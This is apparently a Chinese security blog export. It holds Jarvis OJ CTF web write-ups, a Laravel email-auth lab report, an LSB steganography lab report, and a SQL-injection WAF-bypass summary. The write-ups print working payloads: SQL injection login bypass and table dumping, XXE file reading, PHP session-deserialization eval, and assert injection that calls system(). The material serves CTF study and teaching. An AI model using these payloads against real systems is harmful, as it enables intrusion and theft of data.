#&amp;password=123，页面返回密码错误而不是之前的用户名错误，说明&#39; #没有被过滤。输入username=admin&#39; and 1=1#，页面返回用户名错误，说明新增的空格和and可能存在过滤。于是逐步排查，先将空格改为/**/试试，即输入username=admin&#39;/**/and/**/1=1#，结果发现页面返回密码错误，即可确定，服务器只过滤了空格。 于是就可以通过页面回显结果进行布尔盲注，以页面返回密码错误为True，返回用户名错误为False。这一题关于盲注的解法我准备后面文章再拿来当例子讲（后面准备写一篇关于盲注、报错注入的文章）盲注脚本写在另一篇文章里了，http://miracle778.site/Web安全/SQL注入/SQL注入之布尔盲注.html —— 5/25加 所以这题介绍另一种算是巧解的方法吧。页面存在两种报错返回结果，用户名错误和密码错误，而且输入除admin外的用户名均提示用户名错误，所以可以肯定admin一个用户，进而猜测它的处理逻辑可能为：通过输入的username作为where条件查询密码，如果存在且查询结果与输入的密码相同即爆flag，如果不匹配则返回密码错误，而如果不存在查询结果就报用户名错误。逻辑代码类似于下面:12345678910111213$res = query(select password from user where username=$_POST['username']);//query函数为了简便瞎写了if($res) //查询返回结果不为空集&#123; if(fetch($res)===md5($_POST['password']))&#123; //fetch函数为图简便，也是瞎写的。 echo $flag; &#125; else&#123; //密码不匹配 echo "密码错误"; &#125;&#125;else&#123; echo "用户名错误";&#125; 于是我们可以输入一个不存在的用户名，结合union select语句手动创建一个密码作为sql查询语句的返回结果，然后密码框处输入我们创建的假密码进行绕过。例如输入username=miracle778&#39;/**/union(select(123))#&amp;password=123，结果返回密码错误没有报用户名错误，这说明了我们这个方法是生效的，只是服务器做密码比较的时候可能用了哈希加密，这里推测用了md5加密。于是输入username=miracle778&#39;/**/union(select(md5(&#39;123&#39;)))#&amp;password=123，成功得到flag，如下图示。 0x11 api调用题目描述: 请设法获得目标机器/home/ctf/flag.txt中的flag值。题目入口：http://web.jarvisoj.com:9882/ 题目点进去，是一个输入框输入测试字符串，然后点击Go，抓个包看看。结果如下图示，发现请求和响应包里的Content-Type都是json形式，而且传入和返回的数据都是json形式。 结合题目描述:请设法获得目标机器/home/ctf/flag.txt中的flag值，想到了利用XXE读取文件。于是把请求头里的Content-Type改为application/xml，并传入&lt;name&gt;miracle778&lt;/name&gt;进行测试，如下图，发现返回了XML内容。于是可以确定，此处存在XXE漏洞，然后只需构造payload读取/home/ctf/flag.txt即可。payload:12345&lt;!DOCTYPE miracle [&lt;!ENTITY name SYSTEM "file:///home/ctf/flag.txt"&gt;]&gt;&lt;miracle&gt;&amp;name;&lt;/miracle&gt; 0x12 图片上传漏洞题目描述: 请设法获取/home/ctf/flag.txt 中的flag值。(建议使用png文件上传)题目入口：http://web.jarvisoj.com:32790/ 这题好像是利用一个漏洞，没有做，先留着，以后做了再来写。 0x13 PHPINFO题目描述: 题目入口：http://web.jarvisoj.com:32784/ 题目进去就看到了代码，简单扫一眼下来，发现了serialize session等关键词，猜测跟反序列化有关。而且只要GET传入了phpinfo参数，就会通过构造函数和析构函数，自动调用执行phpinfo()1234567891011121314151617181920212223242526&lt;?php//A webshell is wait for youini_set('session.serialize_handler', 'php');session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = 'phpinfo();'; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET['phpinfo']))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents('index.php'));&#125;?&gt; 于是GET传入phpinfo参数，看一下phpinfo内容先。在phpinfo里面找到了session.serialize_handler设置项，如下图，这个选项的全局变量是php_serialize，而index.php代码里通过ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);改成了php。 这个session.serialize_handler选项，决定php存储session时用的序列化规则格式，而index.php设置的handler和默认的不同，所以会出现问题。具体原理参考：PHP反序列化与Session 我这里简单讲一下，就是三种不同的handler对应三种不同的存储session的序列化、反序列化格式，如果前后不一致，就会出现安全问题。比如此题，形成原理是在用session.serialize_handler = php_serialize存储的字符可以引入 | , 再用session.serialize_handler = php格式取出$_SESSION的值时 “|”会被当成键值对的分隔符。 简单讲完原理后，我们来找一下这题中的读取、写入session语句。我们可以看到index.php代码里有这么一行session_start();，读取了session。那有了读取session的语句，就具备了反序列化session攻击爆flag的条件，不过在哪里写入我们的恶意session呢？ 这里就又要用到phpinfo了，在phpinfo里面还能找到另一个设置，session.upload_progress.enabled session.upload_progress.enabled为On意味着当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。 于是我们可以本地写一个上传文件表单，post一个name=session.upload_progress的input标签，这样就可以通过修改filename的值达到写入session的目的。表单代码如下12345678910111213&lt;html&gt;&lt;head&gt; &lt;title&gt;upload&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data"&gt; &lt;input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="1" /&gt; &lt;input type="file" name="file" /&gt; &lt;input type="submit" /&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 打开burp抓包，把filename修改为我们要写入session里的payload（payload写法具体看前面贴的链接）。|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;} 继续读取Here_1s_7he_fl4g_buT_You_Cannot_see.php文件，对应payload如下:|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:89:\&quot;var_dump(file_get_contents(&#39;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&#39;));\&quot;;} 得到flag 0x14 WEB?题目描述: 这么简单的题，是WEB吗？题目入口：http://web.jarvisoj.com:9891/ 好像是个找源码解线性方程的题，留着，后面做。 0x15 [61dctf]admin题目描述: 题目入口：http://web.jarvisoj.com:32792/ 点击题目去，发现只显示hello world，于是找源码和请求头、响应头，看看有没有提示。结果都没找到，于是用御剑扫一下后台，发现存在robots.txt 访问robots.txt,内容为Disallow: /admin_s3cr3t.php。于是继续访问/admin_s3cr3t.php，直接就得到flag了flag{hello guest}，wtf? 提交一下居然还真是正确的。。好吧 0x16 [61dctf]inject题目描述: 题目入口：http://web.jarvisoj.com:32794/Hint1: 先找到源码再说吧~~ 提示说先找到源码再说，于是试一试常见的备份文件临时文件名，比如.bak、.swp、.save、~等，最后在index.php~找到，源码如下:123456789&lt;?phprequire("config.php");$table = $_GET['table']?$_GET['table']:"test";$table = Filter($table);mysqli_query($mysqli,"desc `secret_&#123;$table&#125;`") or Hacker();$sql = "select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;";$ret = sql_query($sql);echo $ret[0];?&gt; 到这里其实只要了解mysql里面反引号的一些使用细节即可做出此题，不多说，看参考文章吧，mysql反引号和单引号区别 关键语句说明如下 desc &#96;table1&#96; &#96;table2&#96;像上面的sql语句，如果table1存在的话，该语句就不会报错 看回该题的源码，第4行我们可以控制传入的table参数注入desc语句，从而绕过判断。比如输入 ?table=test&#96; &#96;union select database() limit 1,1这个时候，index.php处理代码里面第4行会变成 desc &#96;secret_test&#96; &#96;union select database() limit 1,1 因为secret_test存在，第4行会往下执行而不是跳去Hacker函数。第5行会变成 select ‘flag{xxx}’ from secret_test&#96; &#96;union select database() limit 1,1 之前总结mysql绕过waf的时候，提到过反引号可以代替空格，此处就是这么个作用，所以我们可以传入union语句结合limit限制，输出我们想要注入的语句执行结果。这里limit 1,1是因为，select &#39;flag{xxx}&#39; from sercet_test只返回一个查询结果，所以并上union后，union后面并列的查询语句结果从1开始，即limt 1,n 我们输入 ?table=test&#96; &#96;union select database() limit 1,1 测试一下 得到了预期结果，接下来就是union素质三连击，爆表、爆列、爆flag。payload分别如下: 爆表：?table=test&#96; &#96;union select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1,1 爆列：?table=test&#96; &#96;union select group_concat(column_name) from information_schema.columns where table_schema=database() limit 1,1 爆flag：?table=test&#96; &#96;union select group_concat(flagUwillNeverKnow) from secret_flag limit 1,1 0x17 [61dctf]register题目描述: 题目入口：http://web.jarvisoj.com:32796/Hint1: 二次注入Hint2: register 二次注入在country 这题有点顶，先留着，后面再来写。 0x18 [61dctf]babyphp题目描述: 题目入口：http://web.jarvisoj.com:32798/ 题目点进去是一个博客，把该点的按钮链接都点点掉，发现了一些信息。 说用到了git，这就想到了git源码泄露，于是搜索学习一波，Git泄露的总结 访问http://web.jarvisoj.com:32798/.git/，显示403 Forbidden，说明应该是存在.git目录的，于是用Githack下载一下源码。 源码目录里有一个flag.php，打开看看有没有flag，结果当然是没有，这里的flag被注释掉了。于是只能看一下index.php的代码，index.php部分代码如下12345678910&lt;?phpif (isset($_GET['page'])) &#123; $page = $_GET['page'];&#125; else &#123; $page = "home";&#125;$file = "templates/" . $page . ".php";assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");assert("file_exists('$file')") or die("That file doesn't exist!");?&gt; 可以看到有两行assert语句，所以就想到了代码注入。因为我们能控制$page变量从而影响$file变量，所以此处可以进行注入。第一个assert语句可以写成如下形式assert(&quot;strpos(&#39;templates/{$page}.php&#39;, &#39;..&#39;) === false&quot;)，当 $page=flag&#39;.system(&quot;ls ./&quot;).&#39; 时该语句变为assert(&quot;strpos(&#39;template/flag&#39;.system(&quot;ls ./&quot;).&#39;php&#39;,&#39;..&#39;)===false)，即$file变量变为了三个字符串拼接的结果。从而达到执行system函数的目的 所以最终payload：?page=flag&#39;.system(&quot;cat templates/flag.php&quot;).&#39;，然后再在查看网页源代码里找到flag 0x19 [61dctf]babyxss题目描述: 题目入口：http://web.jarvisoj.com:32800/Hint1: csp bypass 以后来做。。]]></content>
      <categories>
        <category>CTF</category>
        <category>Jarvis</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
        <tag>Jarvis OJ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Laravel-5.8学习]]></title>
    <url>%2FStudy%2FPHP%2FLaravel-5-8%2FLaravel-5-8%E5%AD%A6%E4%B9%A0.html</url>
    <content type="text"><![CDATA[用Laravel框架自带的邮件发送机制实现登录注册认证。 前言Web应用开发课上的实验，之前实验2的时候是自己写php代码实现登录、注册、密码找回功能(不用邮箱验证)，当时还自己看了看jquery、bootstrap4、Ajax简单写了写，本来也打算搬到这个博客上来，但是过了一两个礼拜，忘记自己当时是怎么一步步写的了，惭愧惭愧。。所以这次实验3，趁刚做完，赶紧来记录一下 Laravel基础这次实验我也只是对Laravel快速过了一下，是看的它的中文文档，贴在下面了。Laravel 5.8中文文档 下面说下这个文档咋用，先是进行Laravel安装，然后用laravel新建一个项目，然后就会生成一系列目录，然后了解下各个目录的作用，都存放写什么东西。明白各个目录的作用后，理清一下路由、视图、控制器三个的概念，可以写几个简单的路由和控制器和blade视图文件帮助理解，其实按我自己的理解就是路由建立访问路径和处理函数直接的映射，路由可以通过xxxxController@xxxfunction指定控制器，也可以通过view(xxx)指定xxx.blade.php视图文件。视图是回显的前端代码，控制器处理后端操作。(仅为个人理解，错了勿喷)这些文档里都有，相信比我讲要清楚，所以就不详细写了 对上面的Laravel基础了解过了之后，就可以搞起了，下面就写如何用Laravel自带的邮件发送机制实现登录、注册认证、密码重置功能。(虽然文档里也有，但是文档有些细节没有挑明)，因为是先写了实验报告，所以下面就按照实验报告格式写吧。 实验目的和要求 实验目的：按照前后端混合的开发形式，基于Laravel框架，实现简单和安全的用户注册和登录。 实验要求：（1）实现Email形式的注册功能和相应的登录功能，注册部分具备邮件激活功能（使用Laravel的邮件发送机制）；（2）实现忘记密码时通过重置密码邮件设置新密码（使用Laravel的邮件发送机制）；（3）网页内容基于Laravel的Blade模板；（4）在hosts文件里自定义一个域名，实现通过域名来访问；（5）使用路由机制设计访问路径 实验设计思路因为laravel自带登录认证、邮件发送、密码重置等功能。于是直接调用修改即可。 登录认证功能使用php artisan make:auth命令生成认证所需要的路由和视图，然后就可以使用/login和/register访问登录和注册页面。这里我通过修改生成的resources\views\layouts\下的app.blade.php视图文件的导航栏部分代码，给导航栏换了背景颜色。 只通过上面php artisan make:auth命令生成路由和视图还不够，我们可以尝试输入信息注册，结果会发现报错，报错原因是因为没有生成数据库里的users这些表。于是我们要在.env文件里面配置选择数据库。如下图是我的配置。 选择好数据库，配置好数据库用户名和密码后，再使用php artisan migrate生成larave登录认证需要的表。如下图，命令执行后，数据库lab中自动生成3张表。 然后再尝试注册和登录功能，发现可以正常执行，输入注册信息后，会直接自动登录，而数据库users表也会插入注册填入的信息。 注册邮箱验证上一步中实现了登录和注册功能，不过没有实现邮箱认证。所以这一步就来实现邮箱认证。首先Laravel 也提供了便捷方法来发送和验证邮箱验证请求，我们只需要在app\User.php调用。如下图划红线部分，即为使用代码。 调用了验证邮箱方法后，我们需要对路由进行配置，使其必须通过邮箱验证才能进行登录，而不是填写完注册进行后直接跳转登录。所以我们可以使用路由中间件来限制未验证邮箱用户不能登录或者访问给定路由。routes\web.php里相应代码如下图 实现路由后，我们的网页就具有了邮箱验证功能，但是要实现验证功能的话，必须要发送邮件，邮件模版laravel自带，邮件发送逻辑是在 User 模型类的 sendEmailVerificationNotification 中完成的，无需手动编写，但是发送邮件的邮箱需要我们配置。于是就接着配置邮箱。在.env文件中进行配置，具体可参考https://laravelacademy.org/post/9743.html 进行配置。配置好邮箱后，就能进行认证邮件发送了。 密码重置跟邮件认证功能一样，密码重置功能laravel框架已经自己内置了，我们要做的就是调用它。所以跟上一步一样，在使用 Laravel 提供的密码重置功能之前，先验证 App\User 模型是不是实现了 Illuminate\Contracts\Auth\CanResetPassword 契约。然后使用 Illuminate\Auth\Passwords\CanResetPassword trait 来包含实现该接口需要的方法。如下图红线代码部分。 因为重置密码的路由和视图在laravel进行php artisan make:auth时已经自动生成了，所以现在可以直接通过/password/reset或者点击登录页面的For got your password?链接进入重置密码页面。如下图 配置Apache虚拟主机和hosts文件基本的登录、注册认证、密码重置功能都已经实现了，下面就是配置Apache虚拟主机和hosts文件实现自定义域名访问了。先在Apache的配置文件http.conf文件里开启虚拟主机功能，即找到Virtual hosts选项，将该行下面的# Include conf/extra/httpd-vhosts.conf取消注释。如下图然后在conf/extra/httpd-vhosts.conf文件里配置虚拟主机。配置完后重启apache。然后再修改hosts文件，使127.0.0.1指向apache定义的虚拟域名。如我的虚拟主机域名为yt.weblab.com 这里配置Apache的虚拟主机容易出现错误，比如定义了虚拟主机后，只能通过虚拟主机访问，而localhost访问失效。或者是能用虚拟主机和localhost访问，但是只能访问到index.php,而其他登录、注册等路径均为404。我也是踩着坑过来的(2333~)，下面就放一下我最终的Apache虚拟主机配置代码吧。123456789101112131415161718192021222324252627&lt;VirtualHost *:80&gt; ServerName localhost # 定义localhos解决定义虚拟主机后localhost无法访问 DocumentRoot "D:\\laragon\\www\\library\\public" &lt;Directory "D:\\laragon\\www\\library"&gt; # 解决除index.php外其余页面404问题 Options FollowSymLinks ExecCGI AllowOverride All Order allow,deny Allow from all Require all granted &lt;/Directory&gt;&lt;/VirtualHost&gt;&lt;VirtualHost *:80&gt; DocumentRoot "D:\\laragon\\www\\library\\public" ServerName www.yt.weblab.com ErrorLog "logs/yt.weblab.com-error.log" CustomLog "logs/yt.weblab.com-access.log" common &lt;Directory "D:\\laragon\\www\\library"&gt; # 配置Directory，解决除index.php外其余页面404问题 Options FollowSymLinks ExecCGI AllowOverride All Order allow,deny Allow from all Require all granted &lt;/Directory&gt;&lt;/VirtualHost&gt; 程序测试测试一下实验的功能 先访问登录页面，输入邮箱等信息进行注册。 点击注册按钮后，页面跳转如下图示，这是resources\views\auth\verify.blade.php视图的显示效果。表明我们的认证邮件已经发送出去。 接下来我们去我们填入的邮箱里查找验证邮件，发现收取成功，于是点击蓝色按钮进行认证。点击后，成功实现了自动登录 然后我们测试密码重置功能，进入密码重置页面，输入邮箱，然后点击发送重置密码链接按钮。可以看到，页面出现提示We have e-mailed your password reset link!，表明邮件发送成功 然后再查看我们的邮箱，发现收到了密码重置邮件 点击Reset Password按钮，会跳转到下图页面 在上图重置密码页面输入新密码后，点击重置按钮，即可重置密码。如下图，输入新密码后，会自动登录，同时回显Your password has been reset!提示密码重置成功。]]></content>
      <categories>
        <category>Study</category>
        <category>PHP</category>
        <category>Laravel-5.8</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>Laravel 5.8</tag>
        <tag>邮箱认证</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LSB信息隐藏实验报告]]></title>
    <url>%2FStudy%2F%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F%2FLSB%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.html</url>
    <content type="text"><![CDATA[这学期上的信息隐藏课的实验，这次做的是LSB算法。因为写实验报告是用markdown写然后转pdf提交的，所以就记录下。 前言感觉这个LSB写的有点辣鸡，凑合看吧(233) 本来还想把实验报告改的通顺一点再放上来，但是因为懒，所以直接粘贴过来了。。 实验要求实现LSB信息隐藏算法，使其能够隐藏信息，并且能够还原，然后计算原图和隐藏了信息的图的MSE、PSNR 实验环境采用python进行编程其中python版本是: 3.6用到的库及说明如下：12345678910from PIL import Image # 为了对载体图片进行像素操作import base64 # 实验思路是对文字和图片进行不同方式处理import qrcode # 如果要隐藏的是图片的话，把图片base64编码后再隐藏 # 如果要隐藏的是文字的话，先用qrcode生成一张二维码， # 把文字隐藏在二维码里，然后再把二维码图片base64后隐藏import numpy as np #为了计算PSNR、MSEimport mathimport cv2 实验思路关于这个实验我的设计思路是。 先编写用于读取要隐藏的文件的函数get_data(),相关代码如下。简单解释下，先是根据传入的文件名判断文件的后缀，如果是txt文件则使用generate_qrcode()函数生成包含txt内容的二维码，然后再把二维码图片进行base64转换隐藏。如果是png、jpg、gif文件的话，先调用img_to_b64()函数转为base64编码后，然后再进行隐藏。进行完base64转换后，在要隐藏的数据后面加上\r\n\r\n + 后缀,以此作为结束符，也方便还原，然后把内容从字节流转为8位比特流。 123456789101112131415161718192021222324252627282930313233343536373839# 获取需要隐藏的文件信息def get_data(path): data = '' # 获取文件类型，根据类型不同操作 ext = path[path.find('.') + 1:] if ext.lower() == 'txt': img_path = generate_qrcode(path) # 生成二维码后的文件扩展为png ext = 'png'.upper() ext = '\r\n\r\n' + ext # 藏的时候要把图片扩展名藏进去，方便还原 b64data = img_to_b64(img_path) + ext if ext.lower() in ['png','jpg','gif']: ext = '\r\n\r\n' + ext.upper() b64data = img_to_b64(path) + ext # 把信息转为比特流 for i in range(len(b64data)): data += bin(ord(b64data[i])).replace('0b','').zfill(8) #zfill返回指 定长度字符串，不足填0 return data# 把图片转为base64，返回base64字串def img_to_b64(path): f = open(path,'rb') s = f.read() f.close() res = base64.b64encode(s).decode() return res# 把txt内容转为二维码，返回生成的二维码路径def generate_qrcode(path): f = open(path,'rb') text = f.read() f.close() img = qrcode.make(text) save_path = path[:path.find('.')] + '.png' img.save(save_path) return save_path 编写lsb加密函数，这里用PIL库里的Image包文件，先判断要隐藏的信息是否超过载体最低一位的容量，如果超过即输出提示信息载体装不下，换个大点的吧，然后退出。若没有超过容量的话，就遍历载体图片的像素点，利用模2取出最后一位，然后替换成我们要隐藏的信息。重要操作的话，下面代码都附上了注释，这里就不多叙述了。 123456789101112131415161718192021222324252627282930313233343536373839404142# old 载体，path 隐藏信息，new 新生成的图片def lsb(old,path,new): im = Image.open(old) width,height = im.size[0],im.size[1] count = 0 data = get_data(path) if len(data) &gt; width * height *3: print("载体装不下，换个大点的吧") exit() data_len = len(data) for h in range(height): for w in range(0,width): pixel = im.getpixel((w,h)) #获取像素 a = pixel[0] b = pixel[1] c = pixel[2] # 每次循环前判断是否藏完 if count == data_len: break a = a - mod(a,2) + int(data[count]) # 先把最低一位减了再藏 count += 1 if count == data_len: im.putpixel((w,h),(a,b,c)) break b = b - mod(b,2) + int(data[count]) count += 1 if count == data_len: im.putpixel((w,h),(a,b,c)) break c = c - mod(c,2) + int(data[count]) count += 1 if count == data_len: im.putpixel((w,h),(a,b,c)) break if count % 3 == 0: #一个像素藏完，putpixel一下 im.putpixel((w,h),(a,b,c)) im.save(new) 然后编写解密函数，lsb_decode()，代码如下，这里我是直接把图像的最后一位先全部提出来，然后根据上面加密函数里最后放入的\r\n\r\n标记判断是否结束，然后找出扩展名，将提取出的数据base64解码后存到文件里，这里生成的文件名用lsb_decode.+找出的扩展名。 123456789101112131415161718192021222324def lsb_decode(path): im = Image.open(path) width,height = im.size[0],im.size[1] data = '' for h in range(height): for w in range(width): pixel = im.getpixel((w,h)) #获取像素 for p in pixel[:3]: data += str(mod(p,2)) temp_data = '' for i in range(0,len(data),8): temp = int(data[i:i+8],2) #转成十进制 temp_data += chr(temp) # 藏的信息结束位置 end_pos = temp_data.find('\r\n\r\n') msg_b64 = temp_data[:end_pos] msg_ext = temp_data[end_pos+4:end_pos+7] msg = base64.b64decode(msg_b64) msg_name = "lsb_decode." + msg_ext.lower() f = open(msg_name,'wb') f.write(msg) f.close() 然后编写计算MSE、PSNR的函数，这里代码就是利用PSNR和MSE的公式计算，不多讲。 12345678910def PSNR(old,new): import numpy as np import math import cv2 img1,img2 = cv2.imread(old),cv2.imread(new) mse = np.mean((img1 - img2) ** 2 ) if mse &lt; 1.0e-10: return 100 psnr = 10 * math.log10(255.0**2/mse) print("MSE为:&#123;0&#125;\nPSNR为:&#123;1&#125;".format(mse,psnr)) 实验测试 测试隐藏txt文件，要隐藏的1.txt文件内容为易涛LSB实验测试，使用下面代码测试。预期结果应该是，产生1.png(1.txt的二维码文件)，隐藏有1.pngbase64编码的lsb_encode_txt.bmp文件，和解码还原后的lsb_decode.png二维码 1234567if __name__ == "__main__": data_path = r"1.txt" image_path = r"mitu.bmp" new_path = r"lsb_encode_txt.bmp" lsb(image_path,data_path,new_path) lsb_decode("lsb_encode_txt.bmp") PSNR(image_path,new_path) 下面截图是未执行代码前的截图 执行一下代码，代码执行结果如下，可以看到计算出了MSE和PSNR 而我们的目录也多出来了系列文件，可以扫描下面截图的两个二维码从而获取隐藏的信息易涛LSB实验测试 测试隐藏图片文件，隐藏的文件名为shell.gif，用下面代码测试。预期结果应该是，生成隐藏有shell.gifbase64编码的lsb_encode_img.bmp文件，和解码还原后的lsb_decode.gif文件 1234567if __name__ == "__main__": data_path = r"shell.gif" image_path = r"mitu.bmp" new_path = r"lsb_encode_img.bmp" lsb(image_path,data_path,new_path) lsb_decode("lsb_encode_img.bmp") PSNR(image_path,new_path) 下面是未执行代码前的文件夹目录 代码执行结果截图如下，可以看到计算的MSE和PSNR值，PSNR值比上面小了一些，可能是隐藏的shell.gif的大小比二维码大导致。 执行完后的目录截图如下。可以看到，和预期结果一致。 实验源码整个实验的源码lsb.py如下，实验的代码和测试用到的图片也会以压缩包附件形式上传。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150#!/usr/bin/env python# coding=UTF-8'''@Author: 易涛@LastEditors: 易涛@Description: LSB隐写算法@Date: 2019-04-30 13:41:37@LastEditTime: 2019-05-08 16:43:23'''from PIL import Imageimport base64import qrcode# 获取需要隐藏的文件信息def get_data(path): data = '' # 获取文件类型，根据类型不同操作 ext = path[path.find('.') + 1:] if ext.lower() == 'txt': img_path = generate_qrcode(path) # 生成二维码后的文件扩展为png ext = 'png'.upper() ext = '\r\n\r\n' + ext # 藏的时候要把图片扩展名藏进去，方便还原 b64data = img_to_b64(img_path) + ext if ext.lower() in ['png','jpg','gif']: ext = '\r\n\r\n' + ext.upper() b64data = img_to_b64(path) + ext # 把信息转为比特流 for i in range(len(b64data)): data += bin(ord(b64data[i])).replace('0b','').zfill(8) #zfill返回指定长度字符串，不足填0 return data# 把图片转为base64，返回base64字串def img_to_b64(path): f = open(path,'rb') s = f.read() f.close() res = base64.b64encode(s).decode() return res# 把txt内容转为二维码，返回生成的二维码路径def generate_qrcode(path): f = open(path,'rb') text = f.read() f.close() img = qrcode.make(text) save_path = path[:path.find('.')] + '.png' img.save(save_path) return save_pathdef mod(x,y): return x%y# old 载体，path 隐藏信息，new 新生成的图片def lsb(old,path,new): im = Image.open(old) width,height = im.size[0],im.size[1] count = 0 data = get_data(path) if len(data) &gt; width * height *3: print("载体装不下，换个大点的吧") exit() data_len = len(data) for h in range(height): for w in range(0,width): pixel = im.getpixel((w,h)) #获取像素 a = pixel[0] b = pixel[1] c = pixel[2] # 每次循环前判断是否藏完 if count == data_len: break a = a - mod(a,2) + int(data[count]) # 先把最低一位减了再藏 count += 1 if count == data_len: im.putpixel((w,h),(a,b,c)) break b = b - mod(b,2) + int(data[count]) count += 1 if count == data_len: im.putpixel((w,h),(a,b,c)) break c = c - mod(c,2) + int(data[count]) count += 1 if count == data_len: im.putpixel((w,h),(a,b,c)) break if count % 3 == 0: #一个像素藏完，putpixel一下 im.putpixel((w,h),(a,b,c)) im.save(new)def lsb_decode(path): im = Image.open(path) width,height = im.size[0],im.size[1] data = '' for h in range(height): for w in range(width): pixel = im.getpixel((w,h)) #获取像素 for p in pixel[:3]: data += str(mod(p,2)) temp_data = '' for i in range(0,len(data),8): temp = int(data[i:i+8],2) #转成十进制 temp_data += chr(temp) # 藏的信息结束位置 end_pos = temp_data.find('\r\n\r\n') msg_b64 = temp_data[:end_pos] msg_ext = temp_data[end_pos+4:end_pos+7] msg = base64.b64decode(msg_b64) msg_name = "lsb_decode." + msg_ext.lower() f = open(msg_name,'wb') f.write(msg) f.close()def PSNR(old,new): # target:目标图像 ref:参考图像 scale:尺寸大小 # assume RGB image import numpy as np import math import cv2 img1,img2 = cv2.imread(old),cv2.imread(new) mse = np.mean((img1 - img2) ** 2 ) if mse &lt; 1.0e-10: return 100 psnr = 10 * math.log10(255.0**2/mse) print("MSE为:&#123;0&#125;\nPSNR为:&#123;1&#125;".format(mse,psnr))if __name__ == "__main__": data_path = r"shell.gif" # 自己选择 image_path = r"mitu.bmp" new_path = r"lsb_encode_img.bmp" lsb(image_path,data_path,new_path) lsb_decode("lsb_encode_img.bmp") PSNR(image_path,new_path)]]></content>
      <categories>
        <category>Study</category>
        <category>信息隐藏</category>
      </categories>
      <tags>
        <tag>实验报告</tag>
        <tag>LSB</tag>
        <tag>隐写</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入之WAF Bypass]]></title>
    <url>%2FWeb%E5%AE%89%E5%85%A8%2FSQL%E6%B3%A8%E5%85%A5%2FSQL%E6%B3%A8%E5%85%A5%E4%B9%8BWAF-Bypass.html</url>
    <content type="text"><![CDATA[针对CTF中SQL注入题里的绕过过滤，Bypass WAF做的一些归纳总结。 前言之前做SQL注入相关的CTF题，总是有力不从心的感觉，每次都会被过滤搞到自闭，也是因为自己没有好好总结，导致遇到这种过滤题无从下手。。而看别人的wp的话，经常会看到，用/*1*/、%0b代替空格，用/*!12345 select 1*/直接进行sql语句注入等等。。每次看到这种，总是云里雾里，网上搜索也不好确定关键词，找不到想要的答案。。 所以今天就来系统总结一波。 起手select &#42; from user where id = 1 union select 1,2,table_name from information_schema.tables··· 上面这条sql语句，是一条正常的SQL注入语句。它的斜体是后台PHP进行的正常查询，斜体后面的语句则是我们的注入语句。不过实践中，肯定会存在WAF，会对我们输入的空格、SQL语句关键词做处理。那我今天要研究的就是，如何绕过WAF的检测过滤，重点关注的是绕过WAF对空格的过滤。 既然我们要研究的是绕过空格，那我们把上面的SQL语句按空格的位置来标记分类一下，然后再进行相应研究。1select * from user where id=1&lt;位置1&gt;union&lt;位置2&gt;select&lt;位置3&gt;1,2,table_name&lt;位置4&gt;from&lt;位置5&gt;information_schema.tables··· 这里先归纳一下，sql语句中空格的代替方法:123456/*!50540select user()*/ mysql(独有)内联注释,!后面的数字是版本号，表示当数据库版本&gt;=5.5.40时执行SQL语句/**/ mysql多行注释%09,%0a,%0b,%0c,%0d,%20,%a0 一些空白字符1.1、2.3、1. 浮点数形式0e1、1e7 科学计数法+、-、!、@、~、&#123;&#125;、"、'、()、`` 一些特殊字符 上面总结的各种代替空格的方法，只对SQL语句某些位置起局部代替空格作用，并不适用整体SQL语句语法。所以下面就针对上面对sql语句分的位置1-5做具体分析。 在开始测试前，先对本地环境做个记录。 mysql版本：5.5.40 数据库名：hdu 表名：user user表结构 user表内容 位置1——参数跟union之间先看一下正常查询返回的结果 使用/&#42;&#42;/、和内联注释代替参数跟union中间的空格，关于内联注释里的5位数字在前面以及说过了，这里就不解释了。 用mysql里的空白字符%09(\t),%0a(\n),%0b,%0c,%0d(\r),%20,%a0代替空格，这里说明一下，因为我这里是在mysql客户端下测试，所以%09、%0a、%0b这种输入肯定是不行的，要转成%0b、%0c这种的url解码结果输入才行。正常SQL注入的话是在网页输入框中输入，浏览器会自动解码，所以填%09，%0a这种形式。于是我们把%0b、%0c解码后的字符复制粘贴代替参数和union之间的空格。 浮点数形式代替空格 科学计数法代替空格 特殊符号代替空格，这里测了一下，发现只有()有效，不过挺感觉挺鸡肋的。 位置2——union跟select之间的位置 注释和mysql内联注释 mysql里的空白字符，同样用%0b，%0c url解码后的字符代替空格进行测试 浮点数和科学计数法代替空格此位置处不可用 特殊字符的话，经测试后，也只有()有用。 位置3——select和查询参数之间的位置 注释和mysql内联注释 mysql里的空白字符，同样用%0b，%0c url解码后的字符代替空格进行测试 浮点数和科学计数法代替空格此位置处不可用 特殊字符，经测试~,!,@,+,-,””,’’,{},()可用下面是{},()的测试 位置4——查询参数和from之间的空格 注释和mysql内联注释代替空格可用，此处就不截图了。 mysql里的空白字符，与上面一样，此处不截图 